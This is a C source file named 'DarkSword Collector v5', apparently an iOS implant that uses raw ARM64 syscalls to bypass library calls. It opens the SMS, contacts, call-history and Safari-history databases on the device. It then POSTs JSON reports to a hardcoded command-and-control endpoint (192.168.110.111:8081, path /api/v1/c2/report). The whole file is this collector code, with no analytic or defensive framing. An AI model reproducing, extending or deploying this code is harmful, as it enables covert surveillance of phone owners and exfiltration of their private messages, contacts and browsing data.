/**
 * DarkSword Collector v5 - Raw syscalls + HTTP POST + static buffers
 */

static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
static void _memcpy(char *dst, const char *src, int n) { for(int i=0;i<n;i++) dst[i]=src[i]; }
static int _itoa(int val, char *buf) {
    int i=0; char tmp[16]; int t=0;
    if(val==0){buf[0]='0';buf[1]=0;return 1;}
    while(val>0){tmp[t++]='0'+(val%10);val/=10;}
    for(int j=t-1;j>=0;j--) buf[i++]=tmp[j];
    buf[i]=0; return i;
}

static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}

#define SYS_open    5
#define SYS_read    3
#define SYS_close   6
#define SYS_socket  97
#define SYS_connect 98
#define SYS_send    133

static char s_buf[2048];

static void _http_post(const char *body, int blen) {
    int h = 0;
    const char *hdr = "POST /api/v1/c2/report HTTP/1.1\r\nHost: 192.168.110.111:8081\r\nContent-Type: application/json\r\nContent-Length: ";
    _memcpy(s_buf + h, hdr, _strlen(hdr)); h += _strlen(hdr);
    char nb[8]; _itoa(blen, nb); _memcpy(s_buf + h, nb, _strlen(nb)); h += _strlen(nb);
    const char *tail = "\r\nConnection: close\r\n\r\n";
    _memcpy(s_buf + h, tail, _strlen(tail)); h += _strlen(tail);
    if (h + blen < 2048) { _memcpy(s_buf + h, body, blen); h += blen; }

    int sock = (int)_svc3(SYS_socket, 2, 1, 0);
    if (sock < 0) return;

    unsigned char addr[16];
    for (int i = 0; i < 16; i++) addr[i] = 0;
    addr[0] = 2; addr[1] = 0;
    addr[2] = 0x1f; addr[3] = 0x90;
    addr[4] = 192; addr[5] = 168; addr[6] = 110; addr[7] = 111;

    _svc3(SYS_connect, sock, (long)addr, 16);
    _svc4(SYS_send, sock, (long)s_buf, h, 0);
    _svc1(SYS_close, sock);
}

static void _report(const char *platform, const char *user, const char *token) {
    char body[512];
    int bl = 0;
    const char *p1 = "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"";
    _memcpy(body + bl, p1, _strlen(p1)); bl += _strlen(p1);
    _memcpy(body + bl, platform, _strlen(platform)); bl += _strlen(platform);
    const char *p2 = "\",\"username\":\"";
    _memcpy(body + bl, p2, _strlen(p2)); bl += _strlen(p2);
    _memcpy(body + bl, user, _strlen(user)); bl += _strlen(user);
    const char *p3 = "\",\"token\":\"";
    _memcpy(body + bl, p3, _strlen(p3)); bl += _strlen(p3);
    _memcpy(body + bl, token, _strlen(token)); bl += _strlen(token);
    const char *p4 = "\"}}";
    _memcpy(body + bl, p4, _strlen(p4)); bl += _strlen(p4);
    body[bl] = 0;
    _http_post(body, bl);
}

static void _collect(const char *path, const char *name) {
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) {
        _report(name, "access_denied", path);
        return;
    }
    char data[256];
    int n = (int)_svc3(SYS_read, fd, (long)data, 255);
    _svc1(SYS_close, fd);
    if (n <= 0) n = 0;

    char cnt[16];
    _itoa(n, cnt);
    char result[128];
    int rl = 0;
    const char *s1 = "read_ok:";
    _memcpy(result + rl, s1, _strlen(s1)); rl += _strlen(s1);
    _memcpy(result + rl, cnt, _strlen(cnt)); rl += _strlen(cnt);
    result[rl] = 0;
    _report(name, "read_success", result);
}

void ds_start(void) {
    _report("Collector", "started", "v5");
    _collect("/var/mobile/Library/SMS/sms.db", "SMS");
    _collect("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
    _collect("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
    _collect("/var/mobile/Library/Safari/History.db", "Safari");
    _report("Collector", "done", "v5");
}